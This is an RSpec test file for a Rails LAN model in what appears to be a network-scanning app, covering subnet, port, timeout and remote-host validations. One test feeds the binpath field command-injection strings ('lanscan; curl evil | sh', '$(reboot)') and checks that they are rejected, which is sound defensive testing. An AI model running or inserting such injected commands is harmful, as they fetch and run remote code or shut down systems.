require "rails_helper"

RSpec.describe Lan, type: :model do
  it "has valid primary and secondary factories" do
    expect(build(:lan, :primary)).to be_valid
    expect(build(:lan, :secondary)).to be_valid
  end

  describe "validations" do
    it { is_expected.to validate_presence_of(:lan) }
    it { is_expected.to validate_presence_of(:ports) }

    it "requires a unique subnet (case-insensitive)" do
      create(:lan, lan: "192.168.9.0/24")
      expect(build(:lan, lan: "192.168.9.0/24")).not_to be_valid
    end

    it "rejects a subnet without a CIDR mask" do
      lan = build(:lan, lan: "192.168.1.10")
      expect(lan).not_to be_valid
      expect(lan.errors[:lan].join).to match(/CIDR/)
    end

    it "rejects a subnet wider than the host cap" do
      lan = build(:lan, lan: "10.0.0.0/12")
      expect(lan).not_to be_valid
      expect(lan.errors[:lan].join).to match(/troppo ampia/)
    end

    it "rejects a malformed port range" do
      expect(build(:lan, ports: "80")).not_to be_valid
    end

    it "rejects a timeout outside the allowed range" do
      expect(build(:lan, timeout: 1)).not_to be_valid
      expect(build(:lan, timeout: 20_000)).not_to be_valid
    end

    it "requires exactly one of primary / secondary" do
      expect(build(:lan, primary: false, secondary: false)).not_to be_valid
      expect(build(:lan, :secondary, primary: true)).not_to be_valid
    end

    it "requires remote client IP and user for a secondary LAN" do
      lan = build(:lan, :secondary, remote_client_ip: nil, remote_user: nil)
      expect(lan).not_to be_valid
      expect(lan.errors.attribute_names).to include(:remote_client_ip, :remote_user)
    end

    it "rejects a non-IPv4 remote client IP" do
      expect(build(:lan, :secondary, remote_client_ip: "nope")).not_to be_valid
    end

    it "rejects a malformed remote user" do
      expect(build(:lan, :secondary, remote_user: "bad user!")).not_to be_valid
    end

    it "forbids remote fields on a primary LAN" do
      expect(build(:lan, :primary, remote_client_ip: "10.0.0.1")).not_to be_valid
      expect(build(:lan, :primary, remote_user: "netspy")).not_to be_valid
    end

    it "accepts a plain binpath but rejects one with shell metacharacters" do
      expect(build(:lan, :primary, binpath: "/opt/netspy/lanscan")).to be_valid
      expect(build(:lan, :primary, binpath: "lanscan")).to be_valid
      expect(build(:lan, :primary, binpath: "lanscan; curl evil | sh")).not_to be_valid
      expect(build(:lan, :primary, binpath: "$(reboot)")).not_to be_valid
      expect(build(:lan, :primary, binpath: "a b")).not_to be_valid
    end
  end

  describe "role helpers" do
    it "maps local?/remote? to primary?/secondary?" do
      expect(build(:lan, :primary)).to have_attributes(local?: true, remote?: false)
      expect(build(:lan, :secondary)).to have_attributes(local?: false, remote?: true)
    end
  end
end
